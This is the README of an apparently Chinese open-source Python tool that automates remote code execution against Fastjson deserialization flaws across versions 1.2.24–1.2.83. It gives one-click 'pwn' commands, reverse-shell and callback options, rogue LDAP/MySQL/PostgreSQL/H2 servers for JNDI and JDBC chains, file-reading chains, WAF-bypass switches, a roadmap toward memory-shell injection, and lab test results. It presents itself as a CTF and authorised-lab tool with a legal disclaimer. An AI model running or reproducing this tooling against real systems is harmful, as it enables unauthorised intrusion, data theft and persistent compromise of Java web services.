# fastjsonexploit

面向 **CTF / 本地授权靶场** 的 Fastjson 全版本一键利用工具（Python 3，零依赖可跑）。
专门适配 **无 dnslog、可能无回显** 的比赛环境：探测 → 多链路多变体自动 spray → 回收一条命令完成，
支持 **手动指定目标版本** 精准打击。payload 变体矩阵参考 c0ny1/FastjsonExploit 与公开版本绕过分析；
JNDI 高版本 JDK 绕过参考 JNDI-Injection-Exploit / JNDIExploit 的 BeanFactory 姿势。

> ⚠️ **授权声明**：本工具仅限 CTF 比赛、本地授权靶场与安全教学使用，禁止用于任何未授权测试。

## v1.2.0 更新（网搜可复现版本实测补强）

- **MySQL JDBC 组合链**（对标 fnmsd/MySQL_Fake_Server）：内置纯 Python 假 MySQL 服务端，
  `MiniAdmin` / `LoadBalancedMySQLConnection` 双载体 + `fileread_` 前缀 LOCAL INFILE 任意文件读取，
  已在 1.2.68 + mysql-connector 8.0.19 靶场端到端打通（`--chain mysql --file /etc/passwd`）
- **@JSONType 资源探测链**（CVE-2026-16723 同型，1.2.68-1.2.83）：`jar:http://` 类名触发
  checkAutoType 的 getResourceAsStream 远程 JAR 探测（FatJar 环境下 SSRF 已实测确认），
  恶意 JAR 与类名字节码补丁纯 Python 生成；RCE 端依赖目标 JVM 对特殊类名的
  defineClass 校验放行（8u452 实测拦截点在类名合法性校验，工具如实报告 SSRF 成立）
- **JNDI el/groovy 回传增强**：BeanFactory EL/Groovy 命令经 base64 包裹
  （消除 EL→JS→shell 多层转义损坏），等待窗口加大（EL 经 ProcessBuilder 异步执行，
  回传晚于 JdbcRowSetImpl 的 ClassCastException 属预期）
- **JNDI 双阶段变体选择**：el/groovy 自动采用 remote 阶段实测未被 deny 的变体
- **run_auto 按解析模式分流**：parse 模式走根级双 @type 扫描，Bean 模式走字段发现
  （消除 Bean 模式下根级扫描的假阳性拖延）

## v1.1.0 更新（对标 GitHub 主流利用工具补齐的能力）

- **全自动全版本实测**：内置 `labs/` 靶场矩阵（1.2.24~1.2.83 共 22 个靶场），pwn 命中 19/21（见下文实测矩阵）
- **根级双 `@type` expectClass 扫描**（CVE-2022-25845，1.2.48~1.2.82 autoType off 通用）：
  `{"@type":"java.lang.Exception","@type":G,...}`，无需目标 Bean 字段，gadget 字典自动爆破
- **JNDI 高版本 JDK 绕过**：内置 LDAP 支持 remote（远程恶意类）/ el（Tomcat BeanFactory + ELProcessor）/
  groovy（BeanFactory + GroovyShell）三种模式自动回退；纯 Python 构造序列化 ResourceRef（与 JDK 对拍一致）
- **JNDI 双载体**：JdbcRowSetImpl / c3p0 `JndiRefForwardingDataSource` 自动 spray
- **BCEL autocloseable 变体**：1.2.48~1.2.82 expectClass(AutoCloseable) + BCEL 直打
- **注入点/请求配置**：`--param`（payload 作为 JSON 字段值的二段式解析点，自动转义）、
  `--header`、`--method`、`--proxy`
- **批量目标**：`-f targets.txt --threads N`，detect/pwn 批量并发，每目标独立回传端口
- **探测增强**：deny 类 val 的两段式缓存探针（精确区分 1.2.47/1.2.48+）、JSON.parse 回显模式识别
- expectClass gadget 字典扩充 + 连网型 gadget（xbean JndiConverter 等 JNDI 触发）自动识别

## 安装

```bash
pip install -r requirements.txt   # 仅 requests；缺失时自动回退 urllib，零依赖也可跑
```

## 快速开始

```bash
# 一键模式（零输入）：探测 -> 多链路多变体自动 spray -> HTTP 回传输出
python3 fastjson_exploit.py pwn -u http://target/api/parse -c 'id'

# 批量目标
python3 fastjson_exploit.py pwn -f targets.txt --threads 4 -c 'id'
python3 fastjson_exploit.py detect -f targets.txt --threads 8

# 手动指定目标 fastjson 版本（跳过探测，只打对应变体，最快最隐蔽）
python3 fastjson_exploit.py pwn -u URL -c 'id' --fastjson-version 1.2.43

# 注入点：接口形如 {"json":"<payload>"} 的二段式解析（自动转义引号）
python3 fastjson_exploit.py pwn -u URL -c 'id' --param json

# 自定义请求头 / 方法 / 代理
python3 fastjson_exploit.py pwn -u URL -c 'id' --header 'Cookie: s=1' 'X-Token: abc' --proxy http://127.0.0.1:8080

# 仅指纹探测（含 wrap 变体差分 + 两段式缓存探针）
python3 fastjson_exploit.py detect -u URL

# TemplatesImpl 直打（无出网，需目标 SupportNonPublicField）
python3 fastjson_exploit.py exec -u URL -c 'id' --chain templates --wrap-1247

# BCEL 本地链（无出网、无 NPF 要求；需目标 classpath 有 tomcat-dbcp/commons-dbcp）
python3 fastjson_exploit.py exec -u URL -c 'cat /flag' --chain bcel --wrap-1247

# 时间盲打确认（纯 Java sleep，目标无需 /bin/sh）
python3 fastjson_exploit.py exec -u URL -c 'id' --chain templates --wrap-1247 --blind

# 命令输出 HTTP 回传（目标需有 curl 或 wget）
python3 fastjson_exploit.py exec -u URL -c 'cat /flag' --chain templates --wrap-1247 --callback

# JNDI 反连（内置纯 Python LDAP：remote 恶意类 / BeanFactory EL / Groovy 自动回退）
python3 fastjson_exploit.py exec -u URL -c 'cat /flag' --chain jndi --lhost <本机IP>

# expectClass（≥1.2.48；根级双 @type + 字段发现 + gadget 字典全自动）
python3 fastjson_exploit.py exec -u URL -c 'id' --chain expectclass

# 反弹 shell（先 nc -lvnp 4444）
python3 fastjson_exploit.py shell -u URL --lhost <本机IP> --lport 4444 --kind bash

# 独立回传收集端口 / 独立 LDAP 服务（--mode el/groovy 指定 BeanFactory 模式）
python3 fastjson_exploit.py collect --http-port 8000
python3 fastjson_exploit.py ldap --lport 1389 --lhost <本机IP> --mode el --cmd 'id'

# 无参数进入交互菜单
python3 fastjson_exploit.py
```

## FastJsonParty（lemono0）场景覆盖对照

| FastJsonParty 场景/技术 | 本工具状态 |
|---|---|
| FastJson 鉴别（报错/解析特征/响应状态） | ✅ detect 链 |
| AutoCloseable 精确版本探测 | ✅ |
| DNSLOG 出网探测（InetAddress 等变体） | ✅（自建 HTTP/LDAP 回传替代 dnslog） |
| **依赖类探测（Character 报错法）** | ✅ `--chain deps`（17 类候选；依赖目标回显完整异常，掩码目标不可判） |
| ≤1.2.24 TemplatesImpl / JdbcRowSetImpl / BCEL | ✅ |
| ≤1.2.47 cache1247 / BCEL 两段 / **Mybatis+BCEL** | ✅（mybatis 变体） |
| **C3P0 二次反序列化**（≤1.2.47 不出网通杀，fastjson 原生链） | ❌ 未实现（需 fastjson 原生反序列化 payload 生成器，Roadmap 高优） |
| ≤1.2.60/61 commons-configuration JNDIConfiguration | ✅ 新增（jndi 链载体） |
| ≤1.2.67 Shiro JndiObjectFactory（autotype on） | ✅ 新增（jndi 链载体） |
| 1.2.36-1.2.62 regex ReDoS（版本探测） | ❌ 未实现 |
| ≤1.2.68 **写文件**（SafeFileOutputStream+kryo / commons-io 2.0-2.8 / JDK11 无依赖链） | ❌ 未实现（**不出网场景核心能力，Roadmap 最高优**） |
| ≤1.2.68 **读文件**（commons-io BOM 报错盲注 / DNS 外带） | ❌ 未实现（有 mysql LOCAL INFILE 读文件可部分替代） |
| MySQL JDBC 5.x/6.x 载体（JDBC4Connection 等） | ⚠️ 已有 8.0.19 双载体，5.x/6.x 载体未实现 |
| 1.2.76-1.2.80 **Groovy ASTTransformation 两段远程类加载** | ❌ 未实现（1.2.80 关键 RCE 链，Roadmap 高优；现有 groovy 仅为 LDAP BeanFactory 模式） |
| 1.2.73-1.2.80 Aspectj 读文件回显（三段缓存） | ❌ 未实现 |
| WAF 绕过：Unicode/Hex | ✅ `--unicode-escape` |
| WAF 绕过：**_/- 字段名混淆** | ✅ 新增 `--waf-underscore`（实测 fastjson 正常解析、LDAP 命中） |
| WAF 绕过：字符填充 | ❌ 未实现（易加） |

## 官方 Security Advisory 对照（CVE-2026-16723，fastjson2 wiki）

参考 alibaba/fastjson2 官方通告（FearsOff 负责任披露，2026-07）核实的事实与本工具行为：

| 通告要点 | 本工具状态 |
|---|---|
| 影响范围 1.2.68–1.2.83，默认配置（autoType/safeMode off），仅 Spring Boot fat-jar 部署 | ✅ jartype 链条件判定一致（非 fat-jar 自动探测失败并如实报告） |
| 已验证环境 Spring Boot 2.x/3.x/4.x + JDK 8/11/17/21 | ⚠️ temurin 8u452+/8u504/17 上 SSRF/下载阶段复现；defineClass 端受 JVM 类名一致性校验限制（详见 FAQ，疑为构建差异，公开研究在 Oracle JDK 报告成功） |
| 指定目标类（parseObject(body, Dto.class)）不是缓解措施，DTO 的 Object/Map 字段可嵌套 payload | ✅ 字段发现 + base_type_fields 扫描已覆盖 |
| **"重复调用可能从类缓存返回黑名单类"**（1.2.84 修复项） | ✅ 已实测并固化为"缓存复用"跟进：expectClass 探测把类写入 mappings，后续单 @type 直接引用命中缓存（跳过 deny/whitelist），对剥离双 @type 的 WAF 场景有效 |
| 1.2.84 修复：拒绝含 `:`/`/`/`!` 的类型名；白名单 hash 命中增加文本回验；accept 前缀不再覆盖危险基类 | ✅ 已建 1.2.84 靶场（18029）验证：jartype 类名在 checkAutoType 即拒、缓存技巧失效（双 @type 视作数据） |
| 缓解：升级 1.2.84 / SafeMode / noneautotype / 非 fat-jar | ✅ safeMode 与 noneautotype 语义已在版本矩阵区分 |

## 与 GitHub 主流工具的能力对照 / Roadmap

对标 JNDI-Inject-Exploit、java-chains(web-chains)、JYso(JNDIExploit+ysoserial)、
MySQL_Fake_Server、c0ny1/FastjsonExploit 等项目后的差距分析：

**已对齐**：全版本指纹探测与变体矩阵、JNDI remote/BeanFactory(EL/Groovy) 双模式、
BCEL/TemplatesImpl 本地链、expectClass（根级+字段）、1.2.47 缓存绕过、MySQL JDBC
文件读取、@JSONType jar:http 探测、批量扫描、无 dnslog 自带回传、注入点/请求定制。

**本轮已补齐（v1.2.1）**：
1. ✅ **LDAP 原生反序列化 gadget**：`--chain yso`——LDAP javaSerializedData 下发
   ysoserial payload（CC6 等，本地 java 经 ysoserial-all.jar 生成或 --yso-file 提供），
   命令经 bash 花括号展开包装修复 exec(String) 分词问题；靶场 18026（1.2.47+CC3.2.1）实测 RCE
2. ✅ **PostgreSQL JDBC 链**：`--chain postgres`——expectClass + `org.postgresql.jdbc.PgConnection`
   （构造器即连接，DataSource 系类在 1.2.66+ 被 deny 而仅 PgConnection 可过），内置假 PG
   服务端反连判定；靶场 18027 实测。loggerFile 文件写入依赖 pgjdbc 版本（42.2.25 实测不写）
3. ✅ **H2 数据库链**：`--chain h2`——JdbcDataSource + `INIT=RUNSCRIPT FROM 自建 HTTP`
   （INIT 值内分号会破坏 h2 URL 解析，脚本经 HTTP 下发规避），CREATE ALIAS RCE；
   靶场 18028（1.2.31+h2+ds 模式）实测回传。注意 org.h2.jdbcx.JdbcDataSource 在 1.2.66+ 被 deny

**仍未覆盖**（按实战价值排序，欢迎 PR）：
1. **回显与内存马**：Tomcat/Spring 命令回显、Filter/Servlet/Listener/Agent 内存马注入
   （JNDI-Inject-Exploit / java-chains 核心能力）——本工具仅有 callback 外带回传
2. **本地反序列化 gadget 自动探测**：java-object-searcher 式 classpath gadget 发现
3. **expectClass 进阶姿势**：groovy 类加载 RCE、commons-io IO 链写文件、ASCII jar 覆盖、
   WebSphere 本地 factory、1.2.66/1.2.67 的 Shiro JndiObjectFactory/ignite gadget
4. **JRMP 反连利用**：yso JRMPClient + JRMPListener 组合
5. **Dnslog 平台集成**（ceye/dnslog.cn OOB）——本工具用自建回传（比赛更强），缺第三方平台适配
6. **Fastjson2（QVD-2026-45876，≤2.0.62）**：FNV-1a 哈希碰撞类名绕过——独立解析器，
   需单独实现指纹探测与碰撞类名生成
7. **WAF/RASP 对抗**：JYso 的高版本 JNDI/RASP 绕过姿势、更多编码变形

## CVE 覆盖对照（alibaba/fastjson 1.x 全部 5 个 CVE）

| CVE | 影响版本 | 类型 | 工具覆盖 |
|---|---|---|---|
| CVE-2017-18349 | < 1.2.25 | RCE（@type 直打 JNDI） | ✅ plain 变体（1.2.24 靶场实测） |
| CVE-2025-70974 (CVSS 10) | < 1.2.48 | autoType 处理缺陷 → JNDI 注入（1.2.25 修复不完整的绕过家族） | ✅ L/LL/bracket/mybatis/cache1247 变体矩阵（1.2.25-1.2.47 靶场实测） |
| CVE-2022-25845 | ≤ 1.2.80 | expectClass 绕过默认 autoType 关闭 | ✅ 根级双 @type + 字段扫描（1.2.48-1.2.82 靶场实测） |
| CVE-2026-16723 (CVSS 9) | 1.2.68-1.2.83 | @JSONType 远程类加载（无 gadget） | ⚠️ 探测/SSRF 阶段实测确认；defineClass 端受 JVM 构建差异限制（见 FAQ） |
| CVE-2025-63617 | ktg-mes 应用层 | 应用组合漏洞 | ➖ 非_fastjson 本体缺陷，不适用 |

> 未覆盖：**Fastjson2 QVD-2026-45876**（≤2.0.62，FNV-1a 哈希碰撞绕过白名单，默认配置 RCE，修复于 2.0.63）
> ——独立产品/解析器，可作后续扩展方向。SafeMode 无已知通用绕过（公开研究一致结论）。

## 版本覆盖矩阵

| Fastjson 版本 | 自动尝试的变体 | 前置条件 |
|---|---|---|
| 1.2.24 | JNDI plain / TemplatesImpl plain / BCEL plain | 无 deny 名单；TemplatesImpl 需 NPF |
| 1.2.25-1.2.41 | JNDI `L` 变体 / BCEL cache1247(≥1.2.32) | `L` 需 autoType on；cache1247 需 1.2.32+ |
| 1.2.42 | JNDI `LL` 变体 / cache1247 | `LL` 需 autoType on |
| 1.2.43-1.2.45 | JNDI `[` 变体 / mybatis / cache1247 | `[` 与 mybatis 需 autoType on |
| 1.2.46-1.2.47 | JNDI cache1247 / TemplatesImpl cache1247 / BCEL cache1247 | 无 autoType 要求 |
| 1.2.48-1.2.82 | **根级双 @type expectClass** / BCEL autocloseable / expectClass 字段扫描 / JNDI(BeanFactory 模式) | autoType off 可用；gadget 非 deny 且在 classpath |
| 1.2.83+ | expectClass 字段扫描（应用 Bean 非 10 基类字段） | 双 @type 已修复，需应用自身 Bean |
| 任意版本 + SafeMode | 基本失效 | safeMode 直接拦截所有 @type |

**手动版本模式**（`--fastjson-version`）：直接按版本号取对应变体集合，如 `1.2.43` →
`bracket, mybatis, cache1247`（JNDI）+ `cache1247`（本地链），跳过探测、只打可用变体。

**链路说明**：
- `templates`：`_bytecodes` 触发 defineClass → static 块执行命令，**需** `Feature.SupportNonPublicField`
- `bcel`：`BasicDataSource.driverClassName` + `$$BCEL$$` 编码类，**无出网、无 NPF 要求**；
  1.2.36+ BCEL ClassLoader 渐次进 deny，1.2.48+ 另有 autocloseable 变体，由 spray 自动尝试判定
- `jndi`：JdbcRowSetImpl/c3p0 → 内置 LDAP 三模式：
  - `remote`：下发恶意类（目标 JDK 须信任远程 codebase，<6u211/8u191/11.0.1）
  - `el`：序列化 ResourceRef → Tomcat BeanFactory → ELProcessor eval（目标 classpath 有旧版 Tomcat EL，
    JDK 需 trustSerialData 默认开）
  - `groovy`：同上，GroovyShell evaluate（classpath 有 groovy）
- `expectclass`：根级双 @type（1.2.48-1.2.82 通用，无需 Bean 字段）+ Bean 字段发现 + gadget 字典爆破，
  支持连网型 gadget（xbean JndiConverter 等经 JNDI 反连接管）

## 指纹探测原理

| 探针 | 判定 |
|---|---|
| `{"@type":"java.lang.String"}` | 回显 `safeMode not support autoType` → SafeMode 开启（≥1.2.68） |
| `{"@type":"java.net.InetAddress","val":"127.0.0.1"}` | 被解析 → ≤1.2.47（默认放行）或 autoType on；报 `autoType is not support` → ≥1.2.48 且 autoType 关 |
| L/LL/`[` wrap 变体实例化探针（仅实例化无副作用） | 放行 → 版本上界 ≤1.2.41 / ≤1.2.42 / ≤1.2.45 |
| `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` + plain 跟进 | 两段均放行 → ≤1.2.47（mappings 缓存可用）；①放行②被拦 → ≥1.2.48（cache=false） |

探测请求全部无害（本地回环/仅实例化/不触发 DNS/不出网）。

## pwn 全自动流程

```text
自动: 探测(含变体差分细化) -> [templates -> bcel -> jndi -> expectclass] 逐链逐变体 spray
      >=1.2.48: bcel(autocloseable) -> expectclass(根级双@type -> 字段扫描) -> jndi(BeanFactory 回退)
手动: --fastjson-version 直接锁定变体集合
判定: HTTP 回传收到输出(确认) / 恶意类已下发(确认) / LDAP 已应答(线索) / 响应差分+时间盲测(疑似)
```

## 目录结构

```
fastjson_exploit.py            入口（argparse 子命令 + 交互菜单 + pwn 一键/批量模式）
fastjsonexploit/
├── versions.py                版本矩阵：版本号 -> 变体集合（L/LL/[/mybatis/cache1247/autocloseable）
├── target.py                  HTTP 客户端（requests 优先 / urllib 回退；HttpConf 注入点/头/代理）
├── detector.py                版本指纹探测 + wrap 变体差分 + 两段式缓存探针
├── payloads.py                变体 payload 构造 + 双 @type 构造 + BCEL/unicode 混淆 + 命令生成
├── bytecode.py                class 常量池 UTF8 补丁器 + 纯 Python BCEL 编码器（与 JDK Utility 对拍）
├── expectscan.py              根级双 @type 扫描 + expectClass 字段发现 + gadget 字典爆破
├── server.py                  内置 LDAPv3（remote / 序列化 ResourceRef BeanFactory）+ HTTP 回传
├── blinder.py                 时间盲打 / 响应差异判定
└── ui.py                      菜单与彩色输出
labs/                          本地靶场矩阵（build.sh + run_matrix.sh，docker openjdk8）
templates/                     恶意类模板（JDK8 编译，class 版本 52 全兼容）
logs/                          回传记录日志
```

## 本地靶场矩阵（labs/）

```bash
cd labs && ./build.sh          # 下载 fastjson 14 个版本 + dbcp/c3p0/tomcat/xbean 依赖并编译
./run_matrix.sh start          # 启动 22 个 docker 靶场（端口 18001-18022, host 网络）
./run_matrix.sh stop
```

靶场覆盖：1.2.24~1.2.83 × {parse(autoType on/off), NPF, bean(expectClass), safeMode, 二段式 wrap}。

## 全版本实测结果（本矩阵）

| 靶场 | 结果 | 命中链路 |
|---|---|---|
| 1.2.24 parse | ✅ | bcel plain |
| 1.2.24 npf / 1.2.47 npf | ✅ | templates plain / cache1247 |
| 1.2.31/36/41/42/43/45 autoType on | ✅ | jndi（L/LL/bracket + LDAP remote/BeanFactory） |
| 1.2.47 parse | ✅ | jndi cache1247 |
| 1.2.48 autoType on / 1.2.62/66/68/80 autoType off | ✅ | expectclass（根级双 @type） |
| 1.2.83 parse | ❌ 预期 | 全部绕过已修复，工具正确放弃 |
| 1.2.68 bean / 1.2.83 bean / 1.2.62 bean | ✅ | expectclass（字段扫描 + gadget） |
| 1.2.68 safe | ❌ 预期 | SafeMode 拦截 |
| 1.2.47 二段式 wrap（--param json） | ✅ | jndi（注入点包装生效） |
| 1.2.68 + mysql-connector 8.0.19（--chain mysql） | ✅ | LoadBalancedMySQLConnection + LOCAL INFILE 文件读取（/etc/hostname 回传确认） |
| 1.2.47 + commons-collections 3.2.1（--chain yso） | ✅ | cache1247 触发 + LDAP javaSerializedData CC6（uid 回传确认） |
| 1.2.68 + postgresql 42.2.25（--chain postgres） | ✅ | expectClass + PgConnection 构造器连接（假 PG 反连确认） |
| 1.2.31 + h2 1.4.200（--chain h2, ds 模式） | ✅ | JdbcDataSource + INIT=RUNSCRIPT 自建 HTTP（CREATE ALIAS RCE 回传确认） |
| 1.2.84 修复版 FatJar（18029） | ✅ 正确放弃 | URL 特殊字符类名在 checkAutoType 即拒（官方修复生效） |
| 1.2.83 Spring Boot FatJar（--chain jartype） | ⚠️ | @JSONType 链：远程 JAR 下载（SSRF）实测确认；defineClass 受 JVM 类名校验拦截 |
| 批量 3 目标并发 | ✅ | 独立端口，无冲突 |

> 注：1.2.48+ 的 jndi/expectclass 依赖目标 classpath（gadget/BeanFactory/dbcp）；
> 实际攻防中由 spray 自动尝试并按响应判定，打不出时给出缺失依赖提示。

## 常见问题

- **templates 链报 `set property error, outputProperties`？** 命令其实可能已执行（异常发生在
  getter 触发之后）；用 `--blind` 时间盲测或 `--callback` 确认。
- **jndi 链提示“类未被下载”？** remote 模式需目标 JDK 信任远程 codebase（现代 JDK 默认不信任，
  工具会自动回退 BeanFactory el/groovy 模式）；el/groovy 需目标 classpath 有旧版 Tomcat
  （<8.5.86/9.0.71，新版已移除 forceString）且 trustSerialData 默认开启。
- **BCEL 链未命中？** 1.2.36+ BCEL ClassLoader 进 deny；确认 classpath 有 dbcp 系类。
- **expectclass 提示“双 @type 被当作数据”？** 目标为 1.2.83+（CVE-2022-25845 已修复），
  改用 Bean 字段扫描路径。
- **--param 后未命中？** 该选项适配接口把 payload 包在 JSON 字段字符串里的二段式解析点；
  普通直解析接口不需要该选项。
- **cache1247 在 1.2.25-1.2.31 无效？** 实测该区间 Class-val 不写 mappings（cache=false），
  属 fastjson 历史行为，工具已在版本矩阵中区分。
- **el/groovy 模式提示“LDAP 已应答但疑似未触发”？** JdbcRowSetImpl 载体下 lookup 结果会被
  强转 DataSource 抛 ClassCastException，但 EL/Groovy 已异步执行——本工具对命令做了 base64
  包裹并加大等待窗口，正常情况下可收到回传。
- **jartype 链只确认 SSRF 没 RCE？** 已对照公开研究（QVD-2026-43021 / CVE-2026-16723，
  fearsoff.org、SecureLayer7、Detect-DefenseLab）核实完整链路：stage1 冒号形态
  `jar:http:..<int-ip>:<port>.<path>!.<cls>` 触发远程 JAR 下载与 @JSONType 探测（本工具已
  实测确认），stage2 在 JDK9+ 走 `jar:file:.proc.self.fd.<N>!.<cls>` 重开 jar_cache 的 fd。
  本工具在 temurin 8u492/8u504/17 实测：defineClass 的类名一致性校验要求
  “@type 原串 == 字节码内部名.replace('/','.')”，而资源可达要求 @type 为冒号形态——两者
  在单 payload 内互斥（公开研究在 Oracle JDK 1.8.0_492 报告单阶段成功，我们未能在其
  OpenJDK/temurin 构建复现 defineClass 端，疑为构建差异）。SSRF 成立即证明目标为
  FatJar + 1.2.68-1.2.83，可按上述研究用 fd 链人工跟进。
- **safeMode 靶场为何放弃？** SafeMode（1.2.68+）在解析入口全局禁用 @type，公开研究
  （Detect-DefenseLab 等）亦将其列为唯一可靠缓解，无已知通用绕过，工具正确放弃。

仅限授权环境使用。未授权测试他人系统属于违法行为。
